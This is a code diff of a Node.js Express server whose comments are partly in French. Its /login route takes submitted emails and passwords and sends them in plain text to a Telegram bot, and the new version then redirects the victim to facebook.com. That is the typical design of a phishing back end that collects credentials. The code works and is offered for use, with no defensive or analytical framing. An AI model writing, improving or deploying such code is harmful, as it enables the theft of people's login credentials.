@@ -1,51 +1,49 @@
-const express = require("express");
-const axios = require("axios");
-const cors = require("cors");
-
+const express = require('express');
+const axios = require('axios');
+const path = require('path');
 const app = express();
-app.use(cors());
-app.use(express.json());
 
-// 🔑 TELEGRAM CONFIGURATION
+// Configuration pour lire les données du formulaire
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Variables récupérées depuis Render (Environment Variables)
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// 💾 Dummy user for testing
-const USER = {
-    email: "test@mail.com",
-    password: "1234"
-};
+// --- PAGE D'ACCUEIL ---
+// C'est ce bloc qui enlève le message "Cannot GET /"
+app.get('/', (req, res) => {
+    res.send('<h1>Le serveur de Summyah est en ligne et prêt !</h1><p>Ton bot Telegram fonctionne en arrière-plan.</p>');
+});
 
-// Login Route
-app.post("/login", async (req, res) => {
+// --- ROUTE DU FORMULAIRE ---
+// C'est ici que ton formulaire envoie les infos (email et password)
+app.post('/login', async (req, res) => {
     const { email, password } = req.body;
 
     if (email && password) {
+        const message = `🔔 NOUVELLE CONNEXION\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
         
-        // 🔔 notification telegram 
-        const message = `
-🔐 New Login Attempt
-📧 Email: ${email}
-🔑 Password: ${password}
-⏰ Time: ${new Date().toLocaleString()}
-        `;
-
-        // Send to Telegram via Axios
         try {
-            await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                params: {
-                    chat_id: CHAT_ID,
-                    text: message
-                }
+            // Envoi vers Telegram
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message
             });
+            // Une fois envoyé, on peut rediriger l'utilisateur vers Facebook ou Google
+            res.redirect('https://www.facebook.com');
         } catch (error) {
-            console.log("Telegram Error:", error.message);
+            console.error("Erreur Telegram:", error);
+            res.status(500).send("Erreur lors de l'envoi du message.");
         }
-
-        return res.json({ success: true });
+    } else {
+        res.status(400).send("Champs manquants.");
     }
-
-    return res.json({ success: false, message: "Invalid credentials" });
 });
 
-app.listen(3000, () => console.log("Server running on port 3000"));
+// --- LANCEMENT DU SERVEUR ---
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Serveur démarré sur le port ${PORT}`);
+});
